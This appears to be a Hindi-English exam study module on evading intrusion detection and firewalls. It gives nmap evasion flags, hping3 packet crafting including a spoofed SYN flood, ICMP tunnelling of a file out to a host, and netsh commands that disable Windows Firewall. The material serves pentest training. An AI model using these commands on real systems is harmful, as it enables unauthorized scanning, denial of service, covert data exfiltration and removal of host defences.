# 🛡️ Module 11: IDS/Firewall Evasion

> **Firewall aur IDS bypass karo — exam mein agar normal scan kaam na kare!**

---

## 🔥 Nmap Evasion Techniques

### Fragmentation
```bash
# Fragment packets (split into small pieces)
nmap -f <target_ip>

# Custom MTU (must be multiple of 8)
nmap --mtu 8 <target_ip>
nmap --mtu 16 <target_ip>
nmap --mtu 24 <target_ip>
```

### Decoys (Hide Your IP)
```bash
# Random decoys
nmap -D RND:10 <target_ip>

# Specific decoys
nmap -D 192.168.1.1,192.168.1.2,ME <target_ip>

# ME = your real IP (placed randomly among decoys)
```

### Source Port Manipulation
```bash
# Pretend traffic is from trusted port
nmap -g 80 <target_ip>           # Pretend from HTTP
nmap -g 53 <target_ip>           # Pretend from DNS
nmap --source-port 80 <target_ip>
```

### Timing (Slow Scans)
```bash
nmap -T0 <target_ip>     # Paranoid (very slow)
nmap -T1 <target_ip>     # Sneaky
nmap -T2 <target_ip>     # Polite
nmap -T3 <target_ip>     # Normal (default)
nmap -T4 <target_ip>     # Aggressive
nmap -T5 <target_ip>     # Insane (very fast)
```

### Additional Evasion Flags
```bash
# Append random data to packets
nmap --data-length 25 <target_ip>

# Spoof MAC address
nmap --spoof-mac 0 <target_ip>                 # Random MAC
nmap --spoof-mac Dell <target_ip>              # Dell vendor MAC
nmap --spoof-mac AA:BB:CC:DD:EE:FF <target_ip> # Specific MAC

# Idle/Zombie scan
nmap -sI <zombie_ip> <target_ip>

# Bad checksum (some IDS won't process)
nmap --badsum <target_ip>

# Combine techniques
nmap -f -D RND:5 -g 80 --data-length 25 -T1 <target_ip>
```

---

## 🔨 Hping3 (Packet Crafting for Evasion)

```bash
# SYN scan with specific source port
hping3 -S -p 80 --baseport 53 <target_ip>

# SYN scan with fragmentation
hping3 -S -f -p 80 <target_ip>

# UDP packets
hping3 -2 -p 161 <target_ip>

# ICMP with data
hping3 -1 -d 120 <target_ip>

# SYN flood (DoS - for testing only)
hping3 -S --flood -p 80 <target_ip>
hping3 -S --flood -V -p 80 --rand-source <target_ip>

# Specific TTL
hping3 -S -p 80 --ttl 64 <target_ip>
```

---

## 🧩 Covert Channels

### ICMP Tunneling
```bash
# Using hping3 - send data via ICMP
hping3 -1 -E secret.txt -d 100 <target_ip>

# -1 = ICMP mode
# -E = File to send
# -d = Data size
```

---

## 🔐 Evading Windows Firewall

```cmd
:: Check firewall status
netsh advfirewall show allprofiles

:: Turn off firewall (if you have admin access)
netsh advfirewall set allprofiles state off

:: Add firewall rule to allow port
netsh advfirewall firewall add rule name="Allow Port" protocol=TCP dir=in localport=8080 action=allow
```

---

## ✅ IDS/Firewall Evasion Quick Reference
```
If normal nmap scan blocked, try in this order:
1. nmap -f <target>                    → Fragment packets
2. nmap -g 80 <target>                 → Source port trick
3. nmap -D RND:10 <target>             → Decoy scan
4. nmap --data-length 25 <target>      → Random data padding
5. nmap -T1 <target>                   → Slow scan
6. Combine: nmap -f -g 80 -D RND:5 -T1 <target>
```

